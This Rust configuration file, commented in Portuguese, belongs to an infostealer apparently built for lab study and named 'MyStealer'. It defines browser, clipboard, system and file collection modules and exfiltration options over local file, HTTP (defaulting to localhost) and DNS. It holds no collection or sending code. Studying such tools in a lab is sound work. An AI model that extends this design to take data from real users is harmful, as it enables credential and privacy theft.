//! Configuração do MyStealer

use serde::{Deserialize, Serialize};

/// Configuração principal do aplicativo
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    /// Diretório de saída para dados coletados
    pub output_dir: String,
    
    /// Módulos habilitados para coleta
    pub enabled_modules: Vec<String>,
    
    /// Modo de operação
    pub mode: OperationMode,
    
    /// Configuração de exfiltração
    pub exfil_config: ExfilConfig,
}

impl Config {
    /// Cria nova configuração
    pub fn new(output_dir: String, modules: Vec<String>) -> Self {
        Self {
            output_dir,
            enabled_modules: modules,
            mode: OperationMode::Lab,
            exfil_config: ExfilConfig::default(),
        }
    }
}

impl Default for Config {
    fn default() -> Self {
        Self {
            output_dir: "./output".to_string(),
            enabled_modules: vec![
                "system".to_string(),
                "browser".to_string(),
                "clipboard".to_string(),
                "files".to_string(),
            ],
            mode: OperationMode::Lab,
            exfil_config: ExfilConfig::default(),
        }
    }
}

/// Modo de operação
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum OperationMode {
    /// Modo laboratório - todas as proteções ativas
    Lab,
    /// Modo debug - logging verboso
    Debug,
}

/// Configuração de exfiltração
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExfilConfig {
    /// Tipo de exfiltração
    pub exfil_type: ExfilType,
    
    /// Endpoint para exfiltração HTTP (se aplicável)
    pub http_endpoint: Option<String>,
    
    /// Domínio para exfiltração DNS (se aplicável)
    pub dns_domain: Option<String>,
}

impl Default for ExfilConfig {
    fn default() -> Self {
        Self {
            exfil_type: ExfilType::LocalFile,
            http_endpoint: Some("http://localhost:8080/collect".to_string()),
            dns_domain: None,
        }
    }
}

/// Tipos de exfiltração suportados
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ExfilType {
    /// Salvar em arquivo local
    LocalFile,
    /// Enviar via HTTP
    Http,
    /// Enviar via DNS (avançado)
    Dns,
}

